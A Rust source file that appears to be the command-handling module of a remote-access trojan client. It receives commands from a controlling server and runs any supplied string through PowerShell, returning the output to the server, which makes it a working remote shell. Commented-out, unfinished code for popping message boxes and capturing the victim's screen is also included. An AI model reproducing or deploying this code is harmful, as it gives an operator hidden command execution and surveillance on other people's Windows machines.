
use std::ffi::{CString};
use std::process;
use std::process::Stdio;
use std::time::Duration;
// use windows::core::{PCSTR, s};
// use windows::Win32::Foundation::GetLastError;
// use windows::Win32::Graphics::Gdi::{BI_RGB, BitBlt, BITMAPINFO, BITMAPINFOHEADER, CAPTUREBLT, CreateCompatibleBitmap, CreateCompatibleDC, DeleteDC, DeleteObject, DIB_RGB_COLORS, GetDC, GetDIBits, ReleaseDC, SelectObject, SRCCOPY};
// use windows::Win32::UI::WindowsAndMessaging::{GetSystemMetrics, MB_ICONINFORMATION, MB_OK, MessageBoxA, SM_CXSCREEN, SM_CXVIRTUALSCREEN, SM_CYSCREEN, SM_CYVIRTUALSCREEN, SM_XVIRTUALSCREEN, SM_YVIRTUALSCREEN};
use lib::{Command, send_data, Payload};
use lib::Command::Message;
use crate::Client;


/// Parses the byte buffer into a String then runs the given command
pub fn parse_message(client: &mut Client, command: Command, buf: Vec<u8>) {
    // TODO: remove unwrap
    let message = serde_json::from_slice(&buf).unwrap();

    match command {
        Command::Run => run(client, message),
        Command::Echo => echo(client, message),
        Command::Send => receive(client, message),
        // Command::Message => display_message(client, message),
        // Command::Screenshot => screenshot(client),
        _ => log::debug!("Command not implemented"),
    }
}

pub fn receive(client: &mut Client, message: String) {
    log::trace!("Message received from server: {}", message);
    send_data(Command::Send, &(), &mut client.writer).unwrap()
}

pub fn run(client: &mut Client, command: String) {
    let output = process::Command::new("powershell")
        .args(["-Command", &command])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output();

    let response = match output {
        Ok(output) => {
            if output.status.success() {
                log::trace!("Command: {}. Successful command run {}", command, String::from_utf8_lossy(&output.stdout).to_string());
                format!("Command executed successfully.\nResponse:\n{}", String::from_utf8(output.stdout).unwrap())
            } else {
                log::trace!("Command: {}. Unsuccessful command run {}", command, String::from_utf8_lossy(&output.stderr).to_string());
                format!("Command returned an error. Error message:\n{}", String::from_utf8(output.stderr).unwrap())
            }
        },
        Err(err) => format!("An error occurred while running command: {}", err),
    };
    
    send_data(Command::Send, &response, &mut client.writer).unwrap()
}

pub fn echo(client: &mut Client, message: String) {
    log::debug!("Received message: {}", message);
    if send_data(Command::Send, &message, &mut client.writer).is_ok() {
        log::info!("Successfully echoed data back to server");
    }
    else {
        log::error!("An error occurred while echoing data to server");
    }
}

// // TODO: popup shows undefined behavior
// pub fn display_message(client: &mut Client, message: String) {
//     let message = PCSTR::from_raw(message.as_ptr());
//     let title = s!("Message");
//
//     unsafe {
//         MessageBoxA(
//             None,
//             message,
//             title,
//             MB_OK | MB_ICONINFORMATION
//         );
//     }
// }


// TODO: unfinished, doesn't work
// pub fn screenshot(client: &mut Client) {
//     let mut is_error: bool = false;
//     unsafe {
//         loop {
//             // Get width and height of screen
//             let width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
//             let height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
//
//             // Get device context of entire screen (None)
//             let dc_screen = GetDC(None);
//
//             // Create target DC to copy to
//             let dc_target = CreateCompatibleDC(dc_screen);
//
//             // Create bitmap to hold screenshot
//             let bmp_handle = CreateCompatibleBitmap(dc_target, width, height);
//
//             // Associate target DC to bitmap handle
//             let bmp_obj = SelectObject(dc_target, bmp_handle);
//
//             // Copy bitmap from screen DC to target DC
//             is_error = BitBlt(dc_target, 0, 0, width, height, dc_screen, 0, 0, SRCCOPY | CAPTUREBLT).is_err();
//
//
//             // Free stuff
//             DeleteObject(bmp_handle);
//             DeleteDC(dc_target);
//             ReleaseDC(None, dc_screen);
//
//         }
//     }
// }
